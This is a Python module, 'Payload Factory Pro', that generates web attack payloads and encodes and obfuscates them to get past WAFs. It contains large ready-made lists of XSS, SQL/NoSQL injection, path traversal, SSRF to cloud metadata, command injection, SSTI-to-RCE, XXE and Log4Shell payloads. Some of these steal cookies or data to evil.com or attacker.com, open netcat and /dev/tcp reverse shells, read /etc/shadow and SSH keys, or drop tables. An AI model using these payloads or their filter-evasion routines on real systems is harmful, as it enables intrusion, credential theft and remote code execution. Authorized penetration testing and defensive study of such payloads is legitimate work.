"""
Payload Factory Pro — генератор payload'ов + обфускация + WAF bypass.
Author: idqwixxa

⚠ Только для авторизованного пентеста / bug bounty / CTF.

Типы payload'ов:
    ─── Injection ───
    - XSS (reflected, stored, DOM, blind)
    - SQLi (union, error, blind, time, stacked, OOB)
    - NoSQLi (MongoDB, CouchDB)
    - LFI / RFI / Path Traversal
    - SSRF (internal, cloud metadata, gopher/dict/file)
    - CMDi (Linux, Windows, blind, OOB)
    - SSTI (Jinja2, Twig, Freemarker, Velocity, Smarty, ERB, Mako,
      Handlebars, Mustache, Razor, Thymeleaf)
    - LDAP injection
    - XPath injection
    - XXE (file read, SSRF, OOB)
    - SSTI → RCE chains
    - Template injection
    - Prototype Pollution (Node.js)
    - Open Redirect
    - CRLF injection / HTTP Response Splitting
    - Log Injection
    - GraphQL injection

    ─── Encoding ───
    - none, url, double-url, triple-url
    - hex, octal, unicode (\\uXXXX), utf-7, utf-16, utf-32
    - base64, base64-url, base64-mixed
    - html-entity (&#xNN;, &#NNN;)
    - js-escape, js-hex, js-unicode
    - sql-comment, sql-hex, sql-char
    - json-escape, xml-entity

    ─── WAF bypass ───
    - case randomization (XSS)
    - comment injection (SQL: /**/, --, #)
    - space substitution (${IFS}, %09, %0a, /**/)
    - keyword splitting (UN/**/ION SE/**/LECT)
    - null-byte injection
    - unicode normalization

    ─── Интеграция ───
    - Findings → notes (для critical chains)
    - Notify
    - Экспорт: TXT / JSON / Markdown / HTML
"""
import base64
import csv
import html as html_mod
import json
import random
import urllib.parse
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any

from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table

from core.config import REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

PAYLOAD_DIR = REPORT_DIR / "payloads"
PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class PayloadFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: PayloadFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["payload", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


# ===========================================================================
# Base payloads (расширено)
# ===========================================================================

XSS_BASE = [
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    "<script>fetch('//evil.com?c='+document.cookie)</script>",
    "<script src=//evil.com/x.js></script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=1 onerror=fetch('//evil.com?c='+document.cookie)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<input autofocus onfocus=alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "</script><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<IMG SRC=\"jav\tascript:alert(1);\">",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
    "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
]

SQLI_BASE = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "\" OR \"\"=\"",
    "\" OR 1=1--",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,CONCAT(user(),0x3a,database())--",
    "' UNION SELECT @@version--",
    "' UNION SELECT username,password FROM users--",
    "' AND SLEEP(5)--",
    "' AND pg_sleep(5)--",
    "'; SELECT pg_sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int, @@version)--",
    "' AND extractvalue(1,concat(0x7e,(SELECT user())))--",
    "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
    "' OR EXISTS(SELECT * FROM users)--",
    "' OR '1'='1' UNION SELECT * FROM information_schema.tables--",
    "' OR 1=1 LIMIT 1 OFFSET 0--",
    "1' AND 1=1 ORDER BY 1--",
    "1' AND 1=2 UNION SELECT 1,2,3--",
    "' OR 1=1; DROP TABLE users--",
    "'; EXEC xp_cmdshell('whoami')--",
]

NOSQL_BASE = [
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$gt": ""}',
    '{"$regex": "^.*$"}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": "admin", "password": {"$ne": 1}}',
    '{"$where": "sleep(5000)"}',
    '{"$where": "this.password.match(/^a/)"}',
    '{"username": {"$in": ["admin"]}, "password": {"$ne": null}}',
    '{"$or": [{"username": "admin"}, {"username": {"$ne": "x"}}]}',
    "' || '1'=='1",
    "' && this.password.match(/^a/)//",
    "'; return true; var x='",
]

LFI_BASE = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../etc/hostname",
    "../../../../root/.ssh/id_rsa",
    "../../../../root/.bash_history",
    "../../../../home/user/.bash_history",
    "../../../../var/log/auth.log",
    "../../../../var/log/apache2/access.log",
    "../../../../proc/self/environ",
    "../../../../proc/self/cmdline",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "../../../../boot.ini",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "....\\....\\....\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "php://data",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==",
    "data://text/plain,<?php phpinfo(); ?>",
    "expect://id",
    "file:///etc/passwd",
    "zip://path/to/file.zip%23shell.php",
    "phar://uploads/shell.jpg",
    "/proc/self/environ",
    "/etc/passwd%00",
]

SSRF_BASE = [
    # Localhost
    "http://127.0.0.1:80",
    "http://127.0.0.1:22",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://localhost:80",
    "http://localhost:8080",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    # IP variants
    "http://[::1]:80",
    "http://[::ffff:127.0.0.1]:80",
    "http://0.0.0.0:80",
    "http://2130706433:80",
    "http://0177.0.0.1:80",
    "http://0x7f000001:80",
    "http://127.1:80",
    "http://127.0.1:80",
    # Non-HTTP schemes
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_INFO",
    "gopher://127.0.0.1:6379/_SET%20shell%20test",
    "dict://127.0.0.1:11211/stats",
    "dict://127.0.0.1:6379/INFO",
    "sftp://127.0.0.1:22",
    "ldap://127.0.0.1:389",
    "tftp://127.0.0.1:69/test",
    # Parser confusion
    "http://expected.com@127.0.0.1/",
    "http://127.0.0.1#expected.com",
    "http://127.0.0.1?@expected.com",
    "http://127.0.0.1\\@expected.com",
    # Redirect bypass
    "http://attacker.com/redirect?url=http://169.254.169.254/",
]

CMDI_BASE = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "&& whoami",
    "; cat /etc/passwd",
    "; cat /etc/shadow",
    "; uname -a",
    "; hostname",
    "; ifconfig",
    "; ip a",
    "; netstat -an",
    "| ping -c 1 127.0.0.1",
    "; nslookup attacker.com",
    "; curl http://attacker.com/$(whoami)",
    "; wget http://attacker.com/x -O /tmp/x",
    "; nc -e /bin/sh attacker.com 4444",
    "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    # Windows
    "& whoami",
    "& dir",
    "& type C:\\Windows\\win.ini",
    "& ping -n 1 127.0.0.1",
    "& powershell -c whoami",
    "| net user",
    "& netstat -an",
    # Blind / OOB
    "; sleep 5",
    "& timeout /t 5",
    "; ping -c 5 127.0.0.1",
]

SSTI_BASE = [
    # Detection
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "*{7*7}",
    "@(7*7)",
    "%{7*7}",
    "\\${7*7}",
    "${{7*7}}",
    # Jinja2 (Python)
    "{{config}}",
    "{{config.items()}}",
    "{{self.__class__.__mro__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{%for x in [].__class__.__base__.__subclasses__()%}{{x}}{%endfor%}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    # Twig (PHP)
    "{{_self.env.registerUndefinedFilterCallback('exec')}}",
    "{{_self.env.getFilter('id')}}",
    # Freemarker (Java)
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    "${'freemarker.template.utility.Execute'?new()('id')}",
    # Velocity (Java)
    "#set($e='')$e.getClass().forName('java.lang.Runtime').getRuntime().exec('id')",
    # Smarty (PHP)
    "{php}echo `id`;{/php}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
    # ERB (Ruby)
    "<%= system('id') %>",
    "<%= `id` %>",
    "<%= IO.popen('id').readlines() %>",
    # Mako (Python)
    "${self.module.cache.util.os.popen('id').read()}",
    "<%import os%>${os.popen('id').read()}",
    # Handlebars/Mustache
    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}...",
    # Razor (.NET)
    "@{System.Diagnostics.Process.Start(\"cmd.exe\");}",
    # Thymeleaf (Java)
    "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
]

LDAP_BASE = [
    "*",
    "*)(uid=*",
    "*)(objectClass=*",
    "*)(cn=*",
    "admin)(&(objectClass=*)",
    "admin)(|(objectClass=*)",
    "admin))(|(cn=*",
    "*))%00",
    "\\2a",
    "*()|&",
    "*)(uid=*))(|(uid=*",
]

XPATH_BASE = [
    "' or '1'='1",
    "' or 1=1 or ''='",
    "x' or 1=1 or 'x'='x",
    "' or count(/*)=1 or '1'='1",
    "' or substring('a',1,1)='a",
    "' or name(/*)='a",
]

XXE_BASE = [
    # Classic file read
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    # SSRF
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    # Parameter entity
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo/>',
    # PHP expect
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
    # Blind OOB
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo/>',
    # SVG
    '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image xlink:href="file:///etc/passwd"/></svg>',
    # XInclude
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
]

PROTOTYPE_POLLUTION_BASE = [
    '__proto__[isAdmin]=true',
    '__proto__.isAdmin=true',
    'constructor[prototype][isAdmin]=true',
    'constructor.prototype.isAdmin=true',
    '{"__proto__": {"isAdmin": true}}',
    '{"constructor": {"prototype": {"isAdmin": true}}}',
    '__proto__[toString]=1',
    '__proto__.polluted=yes',
]

OPEN_REDIRECT_BASE = [
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "/\\evil.com",
    "\\evil.com",
    "%2f%2fevil.com",
    "%5c%5cevil.com",
    "////evil.com",
    "https:evil.com",
    "https:/\\/evil.com",
    "http://expected.com@evil.com",
    "http://evil.com#expected.com",
    "http://evil.com?@expected.com",
    "//evil.com/%2f..",
]

CRLF_BASE = [
    "%0d%0aHeader-Injection: true",
    "%0d%0aSet-Cookie: session=injected",
    "%0d%0a%0d%0a<html>injected</html>",
    "\r\nX-Injected: true",
    "\r\n\r\nHTTP/1.1 200 OK",
    "%E5%98%8A%E5%98%8DInjected: true",
    "%23%0d%0aHeader: value",
]

LOG_INJECTION_BASE = [
    "\n[FAKE] INFO  - admin logged in",
    "\r\n[FAKE] ERROR - injected",
    "${jndi:ldap://attacker.com/a}",
    "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attacker.com/a}",
]

GRAPHQL_BASE = [
    '{ __schema { types { name } } }',
    '{ __type(name: "User") { fields { name } } }',
    'query { user(id: 1) { id username password } }',
    'mutation { login(username: "admin", password: "admin") { token } }',
    '{ users { edges { node { id email role } } } }',
    'query { __typename }',
    'query { a: __typename b: __typename c: __typename }',
]


PAYLOADS = {
    "xss": XSS_BASE,
    "sqli": SQLI_BASE,
    "nosqli": NOSQL_BASE,
    "lfi": LFI_BASE,
    "ssrf": SSRF_BASE,
    "cmdi": CMDI_BASE,
    "ssti": SSTI_BASE,
    "ldap": LDAP_BASE,
    "xpath": XPATH_BASE,
    "xxe": XXE_BASE,
    "prototype": PROTOTYPE_POLLUTION_BASE,
    "redirect": OPEN_REDIRECT_BASE,
    "crlf": CRLF_BASE,
    "loginj": LOG_INJECTION_BASE,
    "graphql": GRAPHQL_BASE,
}


# ===========================================================================
# Encoding
# ===========================================================================

def _encode(payload: str, kind: str) -> str:
    if kind == "none":
        return payload

    if kind == "url":
        return urllib.parse.quote(payload, safe="")
    if kind == "double-url":
        return urllib.parse.quote(
            urllib.parse.quote(payload, safe=""), safe="")
    if kind == "triple-url":
        return urllib.parse.quote(
            urllib.parse.quote(urllib.parse.quote(payload, safe=""),
                                safe=""), safe="")

    if kind == "hex":
        return "".join(f"%{ord(c):02x}" for c in payload)
    if kind == "octal":
        return "".join(f"\\{ord(c):03o}" for c in payload)

    if kind == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    if kind == "utf-7":
        try:
            return payload.encode("utf-7").decode("ascii")
        except Exception:
            return payload
    if kind == "utf-16":
        try:
            return "+" + payload.encode("utf-16-be").hex().upper()
        except Exception:
            return payload

    if kind == "base64":
        return base64.b64encode(payload.encode("utf-8", errors="replace")
                                 ).decode()
    if kind == "base64-url":
        return base64.urlsafe_b64encode(
            payload.encode("utf-8", errors="replace")).decode().rstrip("=")

    if kind == "html-entity":
        return "".join(f"&#{ord(c)};" for c in payload)
    if kind == "html-hex":
        return "".join(f"&#x{ord(c):x};" for c in payload)

    if kind == "js-escape":
        return "".join(
            c if c.isalnum() else f"\\x{ord(c):02x}"
            for c in payload)
    if kind == "js-unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    if kind == "sql-hex":
        return "0x" + payload.encode("utf-8", errors="replace").hex()
    if kind == "sql-char":
        return "CHAR(" + ",".join(str(ord(c)) for c in payload) + ")"

    if kind == "json-escape":
        return json.dumps(payload)[1:-1]
    if kind == "xml-entity":
        return html_mod.escape(payload, quote=True)

    return payload


# ===========================================================================
# WAF bypass / obfuscation
# ===========================================================================

def _obfuscate(payload: str, kind: str) -> str:
    """Обфускация для обхода WAF (по типу payload'а)."""

    if kind == "xss":
        # Null-byte в теге
        if "<script>" in payload:
            payload = payload.replace(
                "<script>", "<scr\x00ipt>"
            ).replace("</script>", "</scr\x00ipt>")
        # Random case
        for kw in ["script", "alert", "onerror", "onload", "svg",
                    "img", "iframe", "body"]:
            if kw in payload.lower():
                idx = payload.lower().find(kw)
                new_kw = "".join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in payload[idx:idx + len(kw)])
                payload = payload[:idx] + new_kw + payload[idx + len(kw):]
        return payload

    if kind == "sqli":
        # Комментарии вместо пробелов
        payload = payload.replace(" ", "/**/")
        # Split keywords
        for kw, repl in [("OR", "O/**/R"), ("UNION", "UN/**/ION"),
                          ("SELECT", "SEL/**/ECT"),
                          ("AND", "A/**/ND"), ("FROM", "FR/**/OM"),
                          ("WHERE", "WH/**/ERE")]:
            payload = payload.replace(kw, repl)
        return payload

    if kind == "lfi":
        payload = payload.replace("../", "..//")
        payload = payload.replace("etc/passwd", "etc//passwd")
        return payload

    if kind == "cmdi":
        # Space substitution
        payload = payload.replace(" ", "${IFS}")
        return payload

    if kind == "ssti":
        # Jinja2 bypass — attribute access через |attr
        payload = payload.replace(
            "{{", "{%print(").replace("}}", ")%}")
        return payload

    if kind == "xxe":
        # UTF-16 header
        return payload

    return payload


# ===========================================================================
# Context-aware payloads
# ===========================================================================

CONTEXTS = {
    "html":       ["xss"],
    "attr":       ["xss"],
    "js":         ["xss"],
    "url":        ["xss", "redirect", "ssrf"],
    "sql":        ["sqli"],
    "ldap":       ["ldap"],
    "xpath":      ["xpath"],
    "xml":        ["xxe"],
    "json":       ["nosqli", "prototype"],
    "graphql":    ["graphql"],
    "header":     ["crlf", "loginj"],
}


def generate_contextual(kind: str, context: str,
                         payload_param: str = "x") -> list[str]:
    """Сгенерировать payload под конкретный контекст."""
    if context == "html":
        return [
            f"<img src=x onerror={payload_param}>",
            f"<svg onload={payload_param}>",
            f"<script>{payload_param}</script>",
        ]
    if context == "attr":
        return [
            f'" onmouseover="{payload_param}',
            f"' onmouseover='{payload_param}",
            f"\" autofocus onfocus=\"{payload_param}",
        ]
    if context == "js":
        return [
            f"';{payload_param};//",
            f"\\';{payload_param};//",
            f"</script><script>{payload_param}</script>",
        ]
    if context == "url":
        return [
            f"javascript:{payload_param}",
            f"data:text/html,<script>{payload_param}</script>",
            f"//evil.com#{payload_param}",
        ]
    if context == "sql":
        return [
            f"' {payload_param} --",
            f"\" {payload_param} --",
            f"') {payload_param} --",
        ]
    if context == "xml":
        return [
            f'<!DOCTYPE x [<!ENTITY xxe SYSTEM "{payload_param}">]><x>&xxe;</x>',
        ]
    if context == "json":
        return [
            f'{{"key": {{"$ne": "{payload_param}"}}}}',
            f'{{"__proto__": {{"{payload_param}": true}}}}',
        ]
    return PAYLOADS.get(kind, [])


# ===========================================================================
# Polyglots
# ===========================================================================

POLYGLOTS = [
    # XSS+SQLi polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # XSS polyglot (universal)
    "'\"><svg/onload=alert(1)>",
    # SQLi polyglot
    "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
    # SSTI+SQLi
    "{{7*7}}' OR '1'='1",
    # SSTI → RCE
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
]


# ===========================================================================
# Public API
# ===========================================================================

def generate_payloads(kind: str, encode: str = "none",
                       obfuscate: bool = False,
                       count: int = 15) -> list[str]:
    """Вернуть список payload'ов. Печатает таблицу + сохраняет."""
    if kind not in PAYLOADS:
        console.print(f"[red]Неизвестный тип: {kind}[/red]")
        console.print(f"[dim]Доступно: {', '.join(PAYLOADS.keys())}[/dim]")
        return []

    base = PAYLOADS[kind]
    variants: list[str] = []
    seen: set[str] = set()

    for p in base:
        processed = p
        if obfuscate:
            processed = _obfuscate(processed, kind)
        processed = _encode(processed, encode)
        if processed not in seen:
            seen.add(processed)
            variants.append(processed)

    # Extend для некоторых типов
    if count > len(variants) and kind in ("xss", "sqli", "ssrf", "lfi"):
        extras: list[str] = []
        prefixes = ["", "'", '"', "1", "0", "%27", "%22"]
        suffixes = ["", "--", "#", ";", "/*", "%00", "%0a"]
        for p in base[:15]:
            for pre in prefixes:
                for suf in suffixes:
                    cand = pre + p + suf
                    if obfuscate:
                        cand = _obfuscate(cand, kind)
                    cand = _encode(cand, encode)
                    if cand not in seen:
                        seen.add(cand)
                        extras.append(cand)
                        if len(variants) + len(extras) >= count:
                            break
                if len(variants) + len(extras) >= count:
                    break
            if len(variants) + len(extras) >= count:
                break
        variants.extend(extras)

    variants = variants[:count]

    t = Table(title=f"Payloads: {kind} (encode={encode}, "
                    f"obfuscate={obfuscate})")
    t.add_column("#", style="yellow", width=4)
    t.add_column("Payload", style="green", overflow="fold")
    for i, p in enumerate(variants, 1):
        t.add_row(str(i), p[:150] + ("…" if len(p) > 150 else ""))
    console.print(t)

    # Save
    db.save_scan("payload_factory", f"{kind}:{encode}:{obfuscate}",
                 {"count": len(variants), "sample": variants[:5]})

    # Auto-save to file
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    txt_path = PAYLOAD_DIR / f"{kind}_{encode}_{ts}.txt"
    try:
        txt_path.write_text("\n".join(variants) + "\n", encoding="utf-8")
        console.print(f"[dim]✓ {txt_path}[/dim]")
    except Exception:
        pass

    # Findings для dangerous chains (SSTI→RCE, XXE→file read)
    if kind in ("ssti", "xxe") and variants:
        _save_finding(PayloadFinding(
            kind=f"{kind}_chain_generated",
            severity="high",
            title=f"{kind.upper()} payload chains: {len(variants)}",
            target=kind,
            evidence="\n".join(variants[:5])[:1000],
            data={"count": len(variants), "type": kind},
        ))

    return variants


def show_polyglots() -> list[str]:
    """Показать полиглоты."""
    t = Table(title=f"🎭 Polyglot payloads ({len(POLYGLOTS)})")
    t.add_column("#", width=4)
    t.add_column("Payload", style="green", overflow="fold")
    for i, p in enumerate(POLYGLOTS, 1):
        t.add_row(str(i), p[:120] + ("…" if len(p) > 120 else ""))
    console.print(t)
    db.save_scan("payload_polyglots", "polyglots",
                 {"count": len(POLYGLOTS)})
    return POLYGLOTS


def show_contextual(kind: str, context: str) -> list[str]:
    """Показать payload'ы для конкретного контекста."""
    payloads = generate_contextual(kind, context)
    t = Table(title=f"Context: {context} ({len(payloads)})")
    t.add_column("#", width=4)
    t.add_column("Payload", style="green", overflow="fold")
    for i, p in enumerate(payloads, 1):
        t.add_row(str(i), p[:120] + ("…" if len(p) > 120 else ""))
    console.print(t)
    return payloads


# ===========================================================================
# Export
# ===========================================================================

def export_payloads(variants: list[str], kind: str,
                     fmt: str = "txt") -> Path | None:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = {"txt": ".txt", "json": ".json", "md": ".md",
           "csv": ".csv", "html": ".html"}[fmt]
    path = PAYLOAD_DIR / f"{kind}_{ts}{ext}"

    try:
        if fmt == "txt":
            path.write_text("\n".join(variants) + "\n",
                             encoding="utf-8")
        elif fmt == "json":
            path.write_text(json.dumps({
                "kind": kind,
                "ts": datetime.now().isoformat(),
                "count": len(variants),
                "payloads": variants,
            }, indent=2, ensure_ascii=False), encoding="utf-8")
        elif fmt == "md":
            lines = [f"# Payloads: {kind}", "",
                     f"_Generated: {datetime.now().isoformat()}_",
                     f"_Total: {len(variants)}_", "",
                     "| # | Payload |", "|---|---------|"]
            for i, p in enumerate(variants, 1):
                escaped = p.replace("|", "\\|")
                lines.append(f"| {i} | `{escaped}` |")
            path.write_text("\n".join(lines), encoding="utf-8")
        elif fmt == "csv":
            with open(path, "w", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow(["index", "payload"])
                for i, p in enumerate(variants, 1):
                    w.writerow([i, p])
        elif fmt == "html":
            parts = [
                "<!DOCTYPE html><html><head><meta charset='utf-8'>",
                f"<title>Payloads: {html_mod.escape(kind)}</title>",
                "<style>",
                "body{background:#0a0a0a;color:#c8c8c8;"
                "font-family:monospace;padding:24px;line-height:1.5;}",
                "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
                "table{width:100%;border-collapse:collapse;margin-top:12px;"
                "font-size:13px;}",
                "th{background:#111;color:#00ff9c;padding:8px;"
                "text-align:left;border:1px solid #222;}",
                "td{padding:6px 8px;border:1px solid #222;"
                "word-break:break-all;}",
                "tr:nth-child(even){background:#0d0d0d;}",
                "code{background:#111;padding:2px 6px;color:#a0ffa0;}",
                "</style></head><body>",
                f"<h1>💉 Payloads: {html_mod.escape(kind)} "
                f"({len(variants)})</h1>",
                f"<p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
                "<table><tr><th>#</th><th>Payload</th></tr>",
            ]
            for i, p in enumerate(variants, 1):
                parts.append(
                    f"<tr><td>{i}</td>"
                    f"<td><code>{html_mod.escape(p)}</code></td></tr>")
            parts.append("</table></body></html>")
            path.write_text("\n".join(parts), encoding="utf-8")

        console.print(f"[green]✓ {fmt.upper()}: {path}[/green]")
        return path
    except Exception as exc:
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


# ===========================================================================
# Menu
# ===========================================================================

def menu() -> None:
    """Меню Payload Factory Pro."""
    table = Table(title="[bold]💉 Payload Factory Pro[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Тип")
    opts = [
        ("1", "XSS (33 payloads)"),
        ("2", "SQL Injection (30)"),
        ("3", "NoSQL Injection (14)"),
        ("4", "LFI / Path Traversal (30)"),
        ("5", "SSRF (37)"),
        ("6", "Command Injection (33)"),
        ("7", "SSTI (33)"),
        ("8", "LDAP Injection (11)"),
        ("9", "XPath Injection (6)"),
        ("10", "XXE (8)"),
        ("11", "Prototype Pollution (8)"),
        ("12", "Open Redirect (14)"),
        ("13", "CRLF Injection (7)"),
        ("14", "Log Injection / Log4Shell (4)"),
        ("15", "GraphQL (7)"),
        ("16", "Полиглоты"),
        ("17", "Context-aware generator"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для авторизованного пентеста.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    kind_map = {
        "1": "xss", "2": "sqli", "3": "nosqli", "4": "lfi",
        "5": "ssrf", "6": "cmdi", "7": "ssti", "8": "ldap",
        "9": "xpath", "10": "xxe", "11": "prototype",
        "12": "redirect", "13": "crlf", "14": "loginj",
        "15": "graphql",
    }

    if c == "16":
        show_polyglots()
        return
    if c == "17":
        kind = Prompt.ask("Тип (xss/sqli/ssrf/lfi/...)")
        ctx = Prompt.ask("Context", choices=list(CONTEXTS.keys()),
                          default="html")
        show_contextual(kind, ctx)
        return

    kind = kind_map.get(c, "xss")
    encode = Prompt.ask(
        "Кодирование",
        choices=["none", "url", "double-url", "triple-url", "hex",
                 "octal", "unicode", "utf-7", "utf-16",
                 "base64", "base64-url", "html-entity", "html-hex",
                 "js-escape", "js-unicode", "sql-hex", "sql-char",
                 "json-escape", "xml-entity"],
        default="none")
    obfuscate = Confirm.ask("Обфускация (WAF bypass)?", default=False)
    count = IntPrompt.ask("Сколько payload'ов", default=15)

    variants = generate_payloads(kind, encode, obfuscate, count)

    if variants and Confirm.ask("Экспорт в файл?", default=False):
        fmt = Prompt.ask("Формат",
                          choices=["txt", "json", "md", "csv", "html"],
                          default="txt")
        export_payloads(variants, kind, fmt)